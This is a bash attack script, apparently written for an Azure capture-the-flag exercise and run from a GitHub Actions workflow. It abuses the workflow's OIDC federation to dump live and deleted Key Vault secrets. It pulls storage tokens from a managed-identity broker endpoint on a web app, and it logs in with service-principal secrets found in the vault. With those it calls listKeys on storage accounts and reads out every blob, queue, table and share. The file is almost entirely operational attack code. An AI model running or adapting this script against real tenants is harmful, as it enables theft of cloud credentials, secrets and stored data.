#!/usr/bin/env bash
# CTF DF26 v4: deleted KV secrets + MI-broker blob sweep + fresh SP listKeys.
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID; S=$AZURE_SUBSCRIPTION_ID
KVV=https://kv-tbl-prod-x3euoz.vault.azure.net
M=https://management.azure.com
API_SA=2023-01-01; API_WEB=2022-03-01; API_RES=2021-04-01
FL='DF26\{[^}]\{0,200}\}'
BROKER=https://app-tbl-reporting-prod.azurewebsites.net/k7Qx2mVr9TzLpB4nW8sYdH3cJ6fAe1Gu/t
MI=7a85156a-01c4-4e61-8472-40a92107159b
SAS="sttblreportprod8s42x5 sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz"

OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
fed(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" \
  --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2" | jq -r '.access_token // empty'; }
spn(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" \
  --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
mtok(){ curl -s "$BROKER?r=$1&c=$MI" | jq -r '.token.access_token // empty'; }
D(){ date -u +"%a, %d %b %Y %H:%M:%S GMT"; }

echo "===== CTX run=$GITHUB_RUN_ID ====="

# A) live + deleted KV secrets
VT=$(fed "$C" "https://vault.azure.net/.default")
echo "===== KV LIVE ====="
curl -s "$KVV/secrets?api-version=7.4&includePending=true" -H "Authorization: Bearer $VT" | jq -r '.value[].id' > /tmp/live.txt
cat /tmp/live.txt
echo "===== KV DELETED LIST ====="
DELC=$(curl -s "$KVV/deleted-secrets?api-version=7.4" -H "Authorization: Bearer $VT")
echo "$DELC" | head -c 1200
echo "$DELC" | jq -r '.value[]?.id // empty' > /tmp/del.txt
for u in $(cat /tmp/del.txt); do
  echo "--- DELETED $u"
  curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value // .' | head -c 600; echo
done
# all versions of every live secret
for u in $(cat /tmp/live.txt); do
  for vv in $(curl -s "$u/versions?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[].id // empty'); do
    body=$(curl -s "$vv" -H "Authorization: Bearer $VT")
    echo "$body" | grep -aoE "$FL" && echo "  ^ in $u ver"
  done
done

# B) MI broker sweep of all SAs (blob containers + shares + queues + tables)
STOR=$(mtok "https%3A%2F%2Fstorage.azure.com%2F")
echo "===== MI storage tok len=${#STOR} ====="
for sa in $SAS; do
  echo "-- SA $sa (MI)"
  curl -s "https://$sa.blob.core.windows.net/?comp=list" -H 'x-ms-version: 2021-08-06' -H "x-ms-date: $(D)" -H "Authorization: Bearer $STOR" | head -c 700; echo
  curl -s "https://$sa.file.core.windows.net/?comp=list" -H 'x-ms-version: 2021-06-08' -H "x-ms-date: $(D)" -H "Authorization: Bearer $STOR" | head -c 400; echo
  curl -s "https://$sa.queue.core.windows.net/?comp=list" -H 'x-ms-version: 2019-02-02' -H "x-ms-date: $(D)" -H "Authorization: Bearer $STOR" | head -c 400; echo
  curl -s "https://$sa.table.core.windows.net/" -H 'x-ms-version: 2019-02-02' -H "x-ms-date: $(D)" -H "Authorization: Bearer $STOR" | head -c 400; echo
done
# read blobs in reportprod reports + any MI-readable containers
for sa in $SAS; do
  conts=$(curl -s "https://$sa.blob.core.windows.net/?comp=list" -H 'x-ms-version: 2021-08-06' -H "x-ms-date: $(D)" -H "Authorization: Bearer $STOR" | grep -oE '<Container><Name>[^<]+' | sed 's/.*<Name>//')
  for cont in $conts; do
    for blob in $(curl -s "https://$sa.blob.core.windows.net/$cont?restype=container&comp=list" -H 'x-ms-version: 2021-08-06' -H "x-ms-date: $(D)" -H "Authorization: Bearer $STOR" | grep -oE '<Blob><Name>[^<]+' | sed 's/.*<Name>//'); do
      echo "B $sa/$cont/$blob"
      data=$(curl -s "https://$sa.blob.core.windows.net/$cont/$blob" -H 'x-ms-version: 2021-08-06' -H "x-ms-date: $(D)" -H "Authorization: Bearer $STOR")
      echo "$data" | head -c 800; echo
      echo "$data" | grep -aoE "$FL"
    done
  done
done

# C) fresh SP tokens -> listKeys every SA + RG inventory + site discovery
SECS=$(curl -s "$KVV/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[].id')
for u in $SECS; do
  w=$(curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value // empty')
  aid=$(echo "$w" | jq -r '.appId // empty'); as=$(echo "$w" | jq -r '.clientSecret // empty')
  [ -z "$aid" ] && continue; [ -z "$as" ] && continue
  ARM=$(spn "$aid" "$as" "https://management.azure.com/.default")
  [ ${#ARM} -lt 50 ] && { echo "SP $(basename "$u") dead"; continue; }
  nm=$(basename "$u")
  P(){ curl -s -X POST -H "Authorization: Bearer $ARM" -H 'Content-Length: 0' "$1"; }
  for rg in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
    ids=$(curl -s -H "Authorization: Bearer $ARM" "$M/subscriptions/$S/resourceGroups/$rg/resources?api-version=$API_RES" | jq -r '.value[]?.id // empty')
    [ -n "$ids" ] && { echo "===== INV $rg via $nm"; echo "$ids" | head -30; }
  done
  for rg in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
    for sa in $SAS; do
      KEY=$(P "$M/subscriptions/$S/resourceGroups/$rg/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=$API_SA" | jq -r '.keys[0].value // empty')
      [ -n "$KEY" ] || continue
      echo "===== KEY $sa via $nm in $rg"
      kauth(){ local d; d=$(date -u +"%a, %d %b %Y %H:%M:%S GMT"); curl -s "$1" -H 'x-ms-version: 2021-08-06' -H "x-ms-date: $d" -H "Authorization: SharedKey $sa:$KEY"; }
      for cont in $(kauth "https://$sa.blob.core.windows.net/?comp=list" | grep -oE '<Container><Name>[^<]+' | sed 's/.*<Name>//'); do
        echo "   CONTAINER $cont"
        for blob in $(kauth "https://$sa.blob.core.windows.net/$cont?restype=container&comp=list" | grep -oE '<Blob><Name>[^<]+' | sed 's/.*<Name>//'); do
          echo "      BLOB $blob"
          data=$(kauth "https://$sa.blob.core.windows.net/$cont/$blob")
          echo "$data" | head -c 1000; echo
          echo "$data" | grep -aoE "$FL"
        done
      done
    done
  done
done
echo DONE-V4
